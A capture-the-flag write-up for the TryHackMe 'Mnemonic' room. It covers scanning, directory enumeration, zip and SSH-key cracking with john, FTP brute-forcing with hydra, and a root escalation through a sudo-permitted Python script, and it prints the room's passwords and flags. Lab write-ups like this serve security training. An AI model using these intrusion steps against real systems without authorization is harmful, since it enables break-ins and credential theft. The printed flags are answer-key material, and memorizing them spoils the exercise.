# [Mnemonic](https://tryhackme.com/room/mnemonic)

> I hope you have fun.

## Scanning

scan the target

```
nmap -sS -sV -p- -T4 10.10.11.40
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/551de815-428c-4bb6-b888-7419f98493b4)

there are 3 open ports (21 ftp, 80 http, 1337 ssh)

## HTTP

view the webpage

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/019d831f-f977-4b9e-8302-f56ffdfacf21)

check /robots.txt, i found a secret endpoint

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/20950a12-0f55-49cc-b0bb-02382a8d5aaf)

## Enumeration

try enumerate the directory

```
gobuster dir -u http://10.10.11.40/webmasters/ -w /usr/share/wordlists/dirb/common.txt -t 30
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f64a3970-827e-435c-abe7-4d1f80ad1ed3)

next i try the same process with /admin but found nothing interesting, find some backup files

```
gobuster dir -u http://10.10.11.40/webmasters/backups/ -w /usr/share/wordlists/dirb/common.txt -t 30 -x txt,zip
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3e7e366d-1908-47a2-bf6f-f58f84b64c46)

download the backups.zip, it contains a password

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d19e57f4-0110-4e5a-9ef4-cf52811d2beb)

## Cracking

crack it with john

```
zip2john backups.zip > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
john --show hash
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/3133c0e3-8d8b-4808-b81b-803c95baba63)

we have a message for ftp user

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d29f2338-e3bc-4e81-94f9-7105472e4d39)

bruteforce ftp login with hydra

```
hydra -l ftpuser -P /usr/share/wordlists/rockyou.txt ftp://10.10.11.40
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0ce0bf41-6641-4357-b729-91b2f77fa3ab)

login to ftp, you find 2 files id_rsa and not.txt

```
ftp 10.10.11.40
ftpuser
love4ever
ls
cd data-4
ls
get id_rsa
get not.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/65483845-7f81-4048-b192-216b5e2a26b6)

the id_rsa contain a passphrase

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/f89260ad-649b-4f1a-8367-9b2caaaa04ed)

we must crack it before use

```
python2 /usr/share/john/ssh2john.py id_rsa > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/34d074ba-ea73-4a85-868d-dd3f3e33ab35)

now, ssh into the machine, enter passphrase and password by `bluelove`

```
chmod 600 id_rsa
ssh james@10.10.11.40 -i id_rsa -p 1337
bluelove
bluelove
```

## Exploitation

at james's home folder, you see 2 files 6450.txt and noteforjames.txt as follow

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/68e2aaae-c0cb-4163-88a2-e74f2089c637)

it says "new encryption İmage based name is Mnemonic", so i found a repo in github

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/c1652de7-68a6-4166-9d0e-645de4e959e8)

and i got kick out, cuz the root don't like us here

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4101f1ac-a66e-4c50-bb7f-ebcc3239ad06)

so, login again, we can't cd but can listing

```
ls -la ../condor
```

i found something in condor

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/4242cdf4-326b-4034-88ab-badbfec50fb3)

```
echo "aHR0cHM6Ly9pLnl0aW1nLmNvbS92aS9LLTk2Sm1DMkFrRS9tYXhyZXNkZWZhdWx0LmpwZw==" | base64 -d
echo "VEhNe2E1ZjgyYTAwZTJmZWVlMzQ2NTI0OWI4NTViZTcxYzAxfQ==" | base64 -d
```

we get an image and first flag

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/7d5d0b70-3711-4acb-9c21-05d0c5cea35b)

| Flag | user.txt |
| --- | --- |
| Answer | THM{a5f82a00e2feee3465249b855be71c01} |

## Privilege Escalation

download the image

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/80c3c11e-e542-4c27-812c-b6156609539f)

decrypt the Mnemonic image

```
git clone https://github.com/MustafaTanguner/Mnemonic
cd Mnemonic
pip3 install colored
pip3 install opencv-python
python3 Mnemonic.py
```

enter location of image file

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/0a6ec9c4-cc1d-487f-a353-bd4e9e43d6f5)

ENCRYPT Message is our 6450.txt at james's home folder

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/03661415-319a-4c2c-aa82-47d04420628e)

back to the machine, we have condor password

```
ssh condor@10.10.11.40 -p 1337
pasificbell1981
```

check sudo permission

```
sudo -l -l
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/25eda361-1f37-49ed-8aad-b97c76a9a085)

review the code at /bin/examplecode.py, function `0 .` allows you to input an execute command

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/9615621b-f3e2-42d1-8126-b4a9ce2b4551)

```
sudo python3 /bin/examplecode.py
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/8137c08e-18ec-4606-9dc9-ee3d7e0c89b8)

```
cat /root/root.txt
```

![image](https://github.com/lucthienphong1120/TryHackMe-CTF/assets/90561566/d10bc4cc-236d-4319-9c39-8fb9385d1c44)

md5 hash to get answer flag

```
echo -n "congratulationsyoumadeithashme" | md5sum
```

| Flag | root.txt |
| --- | --- |
| Answer | THM{2a4825f50b0c16636984b448669b0586} |
